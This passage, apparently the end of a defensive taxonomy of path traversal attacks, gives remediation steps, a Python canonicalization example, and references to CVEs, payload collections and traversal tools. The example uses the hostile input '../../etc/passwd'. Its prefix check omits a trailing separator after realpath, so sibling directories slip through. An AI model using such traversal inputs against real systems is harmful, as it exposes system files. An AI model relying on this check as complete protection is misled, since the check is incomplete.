- **Semantic gaps**: String-based blocklists cannot account for all encoding variants, platform-specific behaviors, and normalization edge cases.

### The Structural Solution

Eliminate path traversal at the root cause:

1. **Never pass user input directly to filesystem APIs**. Use indirect references (e.g., database IDs mapped to whitelisted file paths server-side).

2. **Canonicalize paths immediately after input**, then validate the canonical form starts with the expected base directory:
   ```python
   base = "/var/www/files/"
   user_input = "../../etc/passwd"
   canonical = os.path.realpath(os.path.join(base, user_input))
   if not canonical.startswith(os.path.realpath(base)):
       reject()
   ```

3. **Use platform filesystem APIs** (`realpath()`, `Path.GetFullPath()`) that resolve symlinks, normalize separators, and handle encoding — but apply validation **after** canonicalization, not before.

4. **Enforce scheme allowlists** for URL-based file access (reject `file://`, `jar:`, `data:` unless explicitly required).

5. **Validate archive extraction paths** during unpacking — canonicalize each entry's target path and reject if outside the extraction directory. Reject or safely handle symlinks.

6. **Align normalization across layers** — ensure caches, proxies, WAFs, and backends use identical path canonicalization logic, or accept that parser differentials will be exploited.

The 2025 landscape demonstrates that path traversal remains a critical vulnerability class despite decades of awareness. Modern attack surfaces (client-side JavaScript, containerized applications, cloud metadata endpoints, archive extraction pipelines) have expanded the mutation space. Only architectural solutions that eliminate string-based validation in favor of canonical path enforcement can systematically address this vulnerability class.

---

## References

### Academic & Conference Research
- Kettle, James. "Gotta Cache 'Em All: Bending the Rules of Web Cache Exploitation." PortSwigger Research, 2024-2025. [https://portswigger.net/research/gotta-cache-em-all](https://portswigger.net/research/gotta-cache-em-all)
- Backes, Michael, et al. "Large-Scale Analysis of Style Injection by Relative Path Overwrite." WWW 2018 Conference. [https://dl.acm.org/doi/10.1145/3178876.3186090](https://dl.acm.org/doi/10.1145/3178876.3186090)
- "Cached and Confused: Web Cache Deception in the Wild." USENIX Security Symposium, 2020.

### CVE Disclosures & Security Advisories
- CVE-2024-38819: Spring Framework Path Traversal. [https://github.com/advisories/GHSA-g5vr-rgqm-vf78](https://github.com/advisories/GHSA-g5vr-rgqm-vf78)
- CVE-2024-13059: AnythingLLM Path Traversal RCE. [https://www.offsec.com/blog/cve-2024-13059/](https://www.offsec.com/blog/cve-2024-13059/)
- CVE-2025-68428: jsPDF Critical Path Traversal. [https://www.endorlabs.com/learn/cve-2025-68428-critical-path-traversal-in-jspdf](https://www.endorlabs.com/learn/cve-2025-68428-critical-path-traversal-in-jspdf)
- CVE-2024-43093: Android Unicode Normalization Path Traversal. [https://stack.watch/vuln/CVE-2024-43093/](https://stack.watch/vuln/CVE-2024-43093/)
- CVE-2024-28698: CSLA.NET Null Byte Truncation. [https://www.intruder.io/research/path-traversal-and-code-execution-in-csla-net-cve-2024-28698](https://www.intruder.io/research/path-traversal-and-code-execution-in-csla-net-cve-2024-28698)
- CVE-2024-1019: ModSecurity Path Confusion. [https://dayzerosec.com/vulns/2024/02/05/modsecurity-path-confusion-and-really-easy-bypass-on-v2-and-v3.html](https://dayzerosec.com/vulns/2024/02/05/modsecurity-path-confusion-and-really-easy-bypass-on-v2-and-v3.html)
- CVE-2024-21518: OpenCart Zip Slip Vulnerability.
- CVE-2025-64446: Fortinet FortiWeb Authentication Bypass. [https://socprime.com/active-threats/cve-2025-64446/](https://socprime.com/active-threats/cve-2025-64446/)

### Practitioner Resources & Writeups
- PortSwigger Web Security Academy: Path Traversal. [https://portswigger.net/web-security/file-path-traversal](https://portswigger.net/web-security/file-path-traversal)
- PayloadsAllTheThings: Directory Traversal. [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md)
- PayloadsAllTheThings: Client-Side Path Traversal. [https://swisskyrepo.github.io/PayloadsAllTheThings/Client%20Side%20Path%20Traversal/](https://swisskyrepo.github.io/PayloadsAllTheThings/Client%20Side%20Path%20Traversal/)
- OWASP: Path Traversal. [https://owasp.org/www-community/attacks/Path_Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- YesWeHack: Beyond Dot Dot Slash — A Practical Guide to Path Traversal Attacks. [https://www.yeswehack.com/learn-bug-bounty/practical-guide-path-traversal-attacks](https://www.yeswehack.com/learn-bug-bounty/practical-guide-path-traversal-attacks)
- InstaTunnel: "Path Traversal 2.0: Escaping Containers and Reading /etc/passwd in 2025." [https://medium.com/@instatunnel/path-traversal-2-0-escaping-containers-and-reading-etc-passwd-in-2025-809a45ccfe6a](https://medium.com/@instatunnel/path-traversal-2-0-escaping-containers-and-reading-etc-passwd-in-2025-809a45ccfe6a)
- Doyensec: "Bypassing File Upload Restrictions To Exploit Client-Side Path Traversal." [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- Renwa: "Client Side Path Traversal (CSPT) Bug Bounty Reports and Techniques." [https://medium.com/@renwa/client-side-path-traversal-cspt-bug-bounty-reports-and-techniques-8ee6cd2e7ca1](https://medium.com/@renwa/client-side-path-traversal-cspt-bug-bounty-reports-and-techniques-8ee6cd2e7ca1)

### Tools & Repositories
- DotDotPwn: Directory Traversal Fuzzer. [https://github.com/wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn)
- slip: Malicious Archive Generator. [https://github.com/0xless/slip](https://github.com/0xless/slip)
- Advanced Directory Traversal Payloads. [https://github.com/DeepakGhengat/ADVANCED-DIRECTORY-TRAVERSAL-PAYLOADS](https://github.com/DeepakGhengat/ADVANCED-DIRECTORY-TRAVERSAL-PAYLOADS)
- Doyensec CSPTBurpExtension (referenced in research).

### Standards & Specifications
- RFC 3629: UTF-8, a transformation format of ISO 10646 (strict UTF-8 validation).
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'). [https://cwe.mitre.org/data/definitions/22.html](https://cwe.mitre.org/data/definitions/22.html)

---

*This taxonomy was created for defensive security research and vulnerability understanding purposes. All techniques documented are publicly disclosed and intended to improve security posture through comprehensive attack surface awareness.*
